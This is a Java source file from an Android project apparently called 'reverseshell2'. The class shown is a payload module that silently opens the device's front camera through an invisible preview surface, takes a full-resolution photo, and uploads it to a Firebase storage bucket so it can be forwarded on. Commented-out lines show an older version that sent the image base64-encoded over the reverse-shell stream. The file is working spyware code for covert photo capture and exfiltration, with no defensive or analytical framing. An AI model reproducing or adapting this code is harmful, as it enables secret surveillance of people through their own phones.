package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import android.util.Base64;
import android.widget.Toast;

import com.example.reverseshell2.DownloadTask;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;

import java.util.List;


public class CameraPreview {
    private Camera camera;
    StorageReference reference;
    private Context context;
  //  private OutputStream out;
    static String TAG = "cameraPreviewClass";

    public CameraPreview(Context context) {
        try {
            this.context =context;
            reference = FirebaseStorage.getInstance().getReference("uploads");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private int findFrontFacingCamera() {
        int cameraId = -1;
        // Search for the front facing camera
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i = 0; i < numberOfCameras; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                Log.d("DEBUG_TAG", "Camera found");
                cameraId = i;
                break;
            }
        }
        return cameraId;
    }
    public void startUp(int cameraID) {
      //  this.out = outputStream;

        try{
         int   cameraa = findFrontFacingCamera();
            if (cameraa < 0) {
                Log.i(TAG, "startUp: ");
            } else {
                camera = Camera.open(cameraa);
            }
          //  camera = android.hardware.Camera.open(1);
     //   camera = Camera.open();
        }catch (RuntimeException e){
            e.printStackTrace();
//            try {
////          //      out.write("END123\n".getBytes("UTF-8"));
////            } catch (IOException ex) {
////                ex.printStackTrace();
////            }
        }
        Camera.Parameters parameters = camera.getParameters();
        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
        Camera.Size size = allSizes.get(0);
        for (int i = 0; i < allSizes.size(); i++) {
            if (allSizes.get(i).width > size.width)
                size = allSizes.get(i);
        }

        parameters.setPictureSize(size.width, size.height);
        camera.setParameters(parameters);
        try {
        camera.setPreviewTexture(new SurfaceTexture(0));
        camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseCamera();
                sendPhoto(data);

            }
        });
    }

    private void sendPhoto(final byte[] data) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);


        final byte[] byteArr = bos.toByteArray();
        final String encodedImage = Base64.encodeToString(byteArr, Base64.DEFAULT);
        Thread thread = new Thread(new Runnable(){
                @Override
                public void run() {
                    try {  final StorageReference ref=reference.child("damn");
                        ref.putBytes(byteArr).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                            @Override
                            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                               ref.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                                   @Override
                                   public void onSuccess(Uri uri) {
                                       new DownloadTask().execute(uri.toString());
                                   }
                               });
                            }
                        });
//                        out.write(encodedImage.getBytes("UTF-8"));
////                        out.write("END123\n".getBytes("UTF-8"));
                    } catch (Exception e) {
                        Log.e(TAG, e.getMessage());
                    }
                }
            });
            thread.start();
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }



}